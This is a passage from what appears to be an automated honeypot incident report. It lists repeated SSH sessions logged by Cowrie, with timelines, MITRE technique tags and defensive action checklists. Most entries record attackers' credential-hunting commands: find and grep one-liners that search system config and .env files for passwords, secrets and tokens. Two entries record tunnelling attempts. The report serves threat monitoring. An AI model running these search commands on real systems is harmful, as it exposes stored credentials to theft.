| `2026-07-13 12:35:03` | `cowrie.client.kex` |
| `2026-07-13 12:35:05` | `cowrie.login.success` |
| `2026-07-13 12:35:05` | `cowrie.client.var` |
| `2026-07-13 12:35:05` | `cowrie.client.var` |
| `2026-07-13 12:35:06` | `cowrie.session.params` |
| `2026-07-13 12:35:06` | `cowrie.command.input` |
| `2026-07-13 12:35:06` | `cowrie.log.closed` |
| `2026-07-13 12:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-691845866170

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'password|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:06` | `cowrie.session.connect` |
| `2026-07-13 12:35:06` | `cowrie.client.version` |
| `2026-07-13 12:35:07` | `cowrie.client.kex` |
| `2026-07-13 12:35:08` | `cowrie.login.success` |
| `2026-07-13 12:35:08` | `cowrie.client.var` |
| `2026-07-13 12:35:08` | `cowrie.client.var` |
| `2026-07-13 12:35:09` | `cowrie.session.params` |
| `2026-07-13 12:35:09` | `cowrie.command.input` |
| `2026-07-13 12:35:09` | `cowrie.log.closed` |
| `2026-07-13 12:35:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17a60dc9acb9

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'passwd' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:10` | `cowrie.session.connect` |
| `2026-07-13 12:35:10` | `cowrie.client.version` |
| `2026-07-13 12:35:10` | `cowrie.client.kex` |
| `2026-07-13 12:35:11` | `cowrie.login.success` |
| `2026-07-13 12:35:11` | `cowrie.client.var` |
| `2026-07-13 12:35:11` | `cowrie.client.var` |
| `2026-07-13 12:35:12` | `cowrie.session.params` |
| `2026-07-13 12:35:12` | `cowrie.command.input` |
| `2026-07-13 12:35:12` | `cowrie.log.closed` |
| `2026-07-13 12:35:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b0187d85860

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'passwd|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:12` | `cowrie.session.connect` |
| `2026-07-13 12:35:12` | `cowrie.client.version` |
| `2026-07-13 12:35:13` | `cowrie.client.kex` |
| `2026-07-13 12:35:14` | `cowrie.login.success` |
| `2026-07-13 12:35:14` | `cowrie.client.var` |
| `2026-07-13 12:35:14` | `cowrie.client.var` |
| `2026-07-13 12:35:15` | `cowrie.session.params` |
| `2026-07-13 12:35:15` | `cowrie.command.input` |
| `2026-07-13 12:35:15` | `cowrie.log.closed` |
| `2026-07-13 12:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-003c66bba096

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'passwd|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:16` | `cowrie.session.connect` |
| `2026-07-13 12:35:16` | `cowrie.client.version` |
| `2026-07-13 12:35:16` | `cowrie.client.kex` |
| `2026-07-13 12:35:17` | `cowrie.login.success` |
| `2026-07-13 12:35:18` | `cowrie.client.var` |
| `2026-07-13 12:35:18` | `cowrie.client.var` |
| `2026-07-13 12:35:18` | `cowrie.session.params` |
| `2026-07-13 12:35:18` | `cowrie.command.input` |
| `2026-07-13 12:35:18` | `cowrie.log.closed` |
| `2026-07-13 12:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0f7591adfc3

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'passwd|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:19` | `cowrie.session.connect` |
| `2026-07-13 12:35:19` | `cowrie.client.version` |
| `2026-07-13 12:35:19` | `cowrie.client.kex` |
| `2026-07-13 12:35:20` | `cowrie.login.success` |
| `2026-07-13 12:35:21` | `cowrie.client.var` |
| `2026-07-13 12:35:21` | `cowrie.client.var` |
| `2026-07-13 12:35:21` | `cowrie.session.params` |
| `2026-07-13 12:35:21` | `cowrie.command.input` |
| `2026-07-13 12:35:21` | `cowrie.log.closed` |
| `2026-07-13 12:35:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8400c2bf4d8d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'passwd|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:22` | `cowrie.session.connect` |
| `2026-07-13 12:35:22` | `cowrie.client.version` |
| `2026-07-13 12:35:22` | `cowrie.client.kex` |
| `2026-07-13 12:35:23` | `cowrie.login.success` |
| `2026-07-13 12:35:24` | `cowrie.client.var` |
| `2026-07-13 12:35:24` | `cowrie.client.var` |
| `2026-07-13 12:35:25` | `cowrie.session.params` |
| `2026-07-13 12:35:25` | `cowrie.command.input` |
| `2026-07-13 12:35:25` | `cowrie.log.closed` |
| `2026-07-13 12:35:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-742a3ad9562d

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'passwd|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:25` | `cowrie.session.connect` |
| `2026-07-13 12:35:25` | `cowrie.client.version` |
| `2026-07-13 12:35:25` | `cowrie.client.kex` |
| `2026-07-13 12:35:27` | `cowrie.login.success` |
| `2026-07-13 12:35:27` | `cowrie.client.var` |
| `2026-07-13 12:35:27` | `cowrie.client.var` |
| `2026-07-13 12:35:28` | `cowrie.session.params` |
| `2026-07-13 12:35:28` | `cowrie.command.input` |
| `2026-07-13 12:35:28` | `cowrie.log.closed` |
| `2026-07-13 12:35:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f63ee0ad12f

| Field | Detail |
|---|---|
| **Source IP** | `150.228.225[.]198` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:27` | `cowrie.session.connect` |
| `2026-07-13 12:35:28` | `cowrie.client.version` |
| `2026-07-13 12:35:28` | `cowrie.client.kex` |
| `2026-07-13 12:35:31` | `cowrie.login.success` |
| `2026-07-13 12:35:32` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `150.228.225[.]198` to AbuseIPDB if not already reported
- [ ] Block `150.228.225[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb370011d1b6

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'passwd|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:28` | `cowrie.session.connect` |
| `2026-07-13 12:35:28` | `cowrie.client.version` |
| `2026-07-13 12:35:29` | `cowrie.client.kex` |
| `2026-07-13 12:35:30` | `cowrie.login.success` |
| `2026-07-13 12:35:30` | `cowrie.client.var` |
| `2026-07-13 12:35:30` | `cowrie.client.var` |
| `2026-07-13 12:35:31` | `cowrie.session.params` |
| `2026-07-13 12:35:31` | `cowrie.command.input` |
| `2026-07-13 12:35:31` | `cowrie.log.closed` |
| `2026-07-13 12:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-255276fcd80b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'passwd|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:31` | `cowrie.session.connect` |
| `2026-07-13 12:35:31` | `cowrie.client.version` |
| `2026-07-13 12:35:32` | `cowrie.client.kex` |
| `2026-07-13 12:35:33` | `cowrie.login.success` |
| `2026-07-13 12:35:34` | `cowrie.client.var` |
| `2026-07-13 12:35:34` | `cowrie.client.var` |
| `2026-07-13 12:35:34` | `cowrie.session.params` |
| `2026-07-13 12:35:34` | `cowrie.command.input` |
| `2026-07-13 12:35:34` | `cowrie.log.closed` |
| `2026-07-13 12:35:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6b6fe4e116b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'secret' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:35` | `cowrie.session.connect` |
| `2026-07-13 12:35:35` | `cowrie.client.version` |
| `2026-07-13 12:35:35` | `cowrie.client.kex` |
| `2026-07-13 12:35:36` | `cowrie.login.success` |
| `2026-07-13 12:35:37` | `cowrie.client.var` |
| `2026-07-13 12:35:37` | `cowrie.client.var` |
| `2026-07-13 12:35:37` | `cowrie.session.params` |
| `2026-07-13 12:35:37` | `cowrie.command.input` |
| `2026-07-13 12:35:37` | `cowrie.log.closed` |
| `2026-07-13 12:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899e29521b20

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'secret|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:38` | `cowrie.session.connect` |
| `2026-07-13 12:35:38` | `cowrie.client.version` |
| `2026-07-13 12:35:38` | `cowrie.client.kex` |
| `2026-07-13 12:35:39` | `cowrie.login.success` |
| `2026-07-13 12:35:40` | `cowrie.client.var` |
| `2026-07-13 12:35:40` | `cowrie.client.var` |
| `2026-07-13 12:35:41` | `cowrie.session.params` |
| `2026-07-13 12:35:41` | `cowrie.command.input` |
| `2026-07-13 12:35:41` | `cowrie.log.closed` |
| `2026-07-13 12:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fae4f2ccdd6

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'secret|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:41` | `cowrie.session.connect` |
| `2026-07-13 12:35:41` | `cowrie.client.version` |
| `2026-07-13 12:35:42` | `cowrie.client.kex` |
| `2026-07-13 12:35:43` | `cowrie.login.success` |
| `2026-07-13 12:35:43` | `cowrie.client.var` |
| `2026-07-13 12:35:43` | `cowrie.client.var` |
| `2026-07-13 12:35:44` | `cowrie.session.params` |
| `2026-07-13 12:35:44` | `cowrie.command.input` |
| `2026-07-13 12:35:44` | `cowrie.log.closed` |
| `2026-07-13 12:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d26f761576c0

| Field | Detail |
|---|---|
| **Source IP** | `120.224.15[.]67` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:42` | `cowrie.session.connect` |
| `2026-07-13 12:35:42` | `cowrie.client.version` |
| `2026-07-13 12:35:42` | `cowrie.client.kex` |
| `2026-07-13 12:35:45` | `cowrie.login.success` |
| `2026-07-13 12:35:46` | `cowrie.direct-tcpip.request` |
| `2026-07-13 12:35:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.224.15[.]67` to AbuseIPDB if not already reported
- [ ] Block `120.224.15[.]67` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b178fc468c3

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat error 2>/dev/null | grep -iE 'secret|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:44` | `cowrie.session.connect` |
| `2026-07-13 12:35:44` | `cowrie.client.version` |
| `2026-07-13 12:35:44` | `cowrie.client.kex` |
| `2026-07-13 12:35:46` | `cowrie.login.success` |
| `2026-07-13 12:35:46` | `cowrie.client.var` |
| `2026-07-13 12:35:46` | `cowrie.client.var` |
| `2026-07-13 12:35:47` | `cowrie.session.params` |
| `2026-07-13 12:35:47` | `cowrie.command.input` |
| `2026-07-13 12:35:47` | `cowrie.log.closed` |
| `2026-07-13 12:35:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56bf5bd9313e

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat near 2>/dev/null | grep -iE 'secret|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:47` | `cowrie.session.connect` |
| `2026-07-13 12:35:47` | `cowrie.client.version` |
| `2026-07-13 12:35:48` | `cowrie.client.kex` |
| `2026-07-13 12:35:49` | `cowrie.login.success` |
| `2026-07-13 12:35:49` | `cowrie.client.var` |
| `2026-07-13 12:35:49` | `cowrie.client.var` |
| `2026-07-13 12:35:50` | `cowrie.session.params` |
| `2026-07-13 12:35:50` | `cowrie.command.input` |
| `2026-07-13 12:35:50` | `cowrie.log.closed` |
| `2026-07-13 12:35:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47eda50e81c9

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat unexpected 2>/dev/null | grep -iE 'secret|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:51` | `cowrie.session.connect` |
| `2026-07-13 12:35:51` | `cowrie.client.version` |
| `2026-07-13 12:35:51` | `cowrie.client.kex` |
| `2026-07-13 12:35:52` | `cowrie.login.success` |
| `2026-07-13 12:35:52` | `cowrie.client.var` |
| `2026-07-13 12:35:52` | `cowrie.client.var` |
| `2026-07-13 12:35:53` | `cowrie.session.params` |
| `2026-07-13 12:35:53` | `cowrie.command.input` |
| `2026-07-13 12:35:53` | `cowrie.log.closed` |
| `2026-07-13 12:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-314fb1697c8b

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat token 2>/dev/null | grep -iE 'secret|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:53` | `cowrie.session.connect` |
| `2026-07-13 12:35:53` | `cowrie.client.version` |
| `2026-07-13 12:35:54` | `cowrie.client.kex` |
| `2026-07-13 12:35:55` | `cowrie.login.success` |
| `2026-07-13 12:35:56` | `cowrie.client.var` |
| `2026-07-13 12:35:56` | `cowrie.client.var` |
| `2026-07-13 12:35:57` | `cowrie.session.params` |
| `2026-07-13 12:35:57` | `cowrie.command.input` |
| `2026-07-13 12:35:57` | `cowrie.log.closed` |
| `2026-07-13 12:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78673458b161

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:35 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat `('\n 2>/dev/null | grep -iE 'secret|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:35:57` | `cowrie.session.connect` |
| `2026-07-13 12:35:57` | `cowrie.client.version` |
| `2026-07-13 12:35:57` | `cowrie.client.kex` |
| `2026-07-13 12:35:59` | `cowrie.login.success` |
| `2026-07-13 12:35:59` | `cowrie.client.var` |
| `2026-07-13 12:35:59` | `cowrie.client.var` |
| `2026-07-13 12:36:00` | `cowrie.session.params` |
| `2026-07-13 12:36:00` | `cowrie.command.input` |
| `2026-07-13 12:36:00` | `cowrie.log.closed` |
| `2026-07-13 12:36:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b459471c2b16

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `find /home /etc /opt /var -type f \( -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.txt' -o -name '*.env' -o -name '*.sh' \) -exec grep -li 'token' {} \; 2>/dev/null | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:00` | `cowrie.session.connect` |
| `2026-07-13 12:36:00` | `cowrie.client.version` |
| `2026-07-13 12:36:00` | `cowrie.client.kex` |
| `2026-07-13 12:36:02` | `cowrie.login.success` |
| `2026-07-13 12:36:02` | `cowrie.client.var` |
| `2026-07-13 12:36:02` | `cowrie.client.var` |
| `2026-07-13 12:36:03` | `cowrie.session.params` |
| `2026-07-13 12:36:03` | `cowrie.command.input` |
| `2026-07-13 12:36:03` | `cowrie.log.closed` |
| `2026-07-13 12:36:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fca1bddb298a

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat -bash: 2>/dev/null | grep -iE 'token|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:03` | `cowrie.session.connect` |
| `2026-07-13 12:36:03` | `cowrie.client.version` |
| `2026-07-13 12:36:04` | `cowrie.client.kex` |
| `2026-07-13 12:36:05` | `cowrie.login.success` |
| `2026-07-13 12:36:05` | `cowrie.client.var` |
| `2026-07-13 12:36:05` | `cowrie.client.var` |
| `2026-07-13 12:36:06` | `cowrie.session.params` |
| `2026-07-13 12:36:06` | `cowrie.command.input` |
| `2026-07-13 12:36:06` | `cowrie.log.closed` |
| `2026-07-13 12:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.42.87[.]156` to AbuseIPDB if not already reported
- [ ] Block `27.42.87[.]156` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-998e2b771419

| Field | Detail |
|---|---|
| **Source IP** | `27.42.87[.]156` |
| **First Seen** | 2026-07-13 12:36 |
| **Last Seen** | 2026-07-13 12:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cat syntax 2>/dev/null | grep -iE 'token|pass|user|secret|token|key|auth' | head -20` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-13 12:36:06` | `cowrie.session.connect` |
